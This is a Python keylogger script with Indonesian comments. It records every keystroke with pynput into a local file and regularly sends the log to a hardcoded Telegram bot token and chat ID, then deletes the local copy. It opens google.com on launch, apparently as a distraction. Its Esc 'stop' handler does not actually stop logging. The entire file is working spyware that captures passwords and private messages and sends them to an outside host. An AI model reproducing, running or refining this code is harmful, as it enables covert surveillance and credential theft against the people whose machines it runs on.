import os
import time
from pynput.keyboard import Key, Listener
import threading
import webbrowser
import requests

# Informasi Telegram bot
log_file = os.path.join(os.path.dirname(__file__), 'message.txt')
bot_token = "7390806693:AAGDNK2npBDFuBeDou3ZHVgER_M_uscliQI"  # Ganti dengan Token Bot Telegram dari BotFather
chat_id = "-4542608297"  # Ganti dengan chat ID penerima, bisa berupa ID individu atau grup

# Fungsi untuk mengirim log melalui bot Telegram
def send_telegram_message(log_file, bot_token, chat_id):
    # Baca isi log file
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            log_content = f.read()
    else:
        log_content = "Log file tidak ditemukan."

    # Kirim pesan menggunakan Bot API Telegram
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": f"Berikut adalah log file hasil keylogger:\n\n{log_content}"
    }
    
    # Kirim permintaan ke server Telegram
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"Log file '{log_file}' berhasil dikirim ke chat ID {chat_id}")
        else:
            print(f"Gagal mengirim log file: {response.text}")
    except Exception as e:
        print(f"Error saat mengirim log file: {e}")
        
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Fungsi untuk menghentikan keylogger jika tombol Esc ditekan
def on_release(key):
    if key == Key.esc:
        return True
def open_browser():
    url = "https://www.google.com"  # Ganti dengan URL yang ingin kamu buka
    webbrowser.open(url)
# Fungsi untuk memantau file log dan mengirimkan pesan jika ukurannya > 1KB
def monitor_log_file(interval=1200):
    last_sent_time = time.time()  # Waktu saat program mulai
    
    while True:
        current_time = time.time()
        if (current_time - last_sent_time > interval) or (os.path.exists(log_file) and os.path.getsize(log_file) > 1024):
            if os.path.exists(log_file) and os.path.getsize(log_file) > 0:  # Kirim pesan jika ada konten
                send_telegram_message(log_file, bot_token, chat_id)
                os.remove(log_file)  # Hapus file setelah dikirim
            last_sent_time = current_time  # Reset waktu terakhir pesan dikirim
        time.sleep(60)  # Cek setiap interval detik

# Fungsi untuk menjalankan keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Jalankan keylogger dan monitoring secara bersamaan menggunakan threading
if __name__ == "__main__":
    open_browser()
    t1 = threading.Thread(target=start_keylogger)
    t2 = threading.Thread(target=monitor_log_file)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
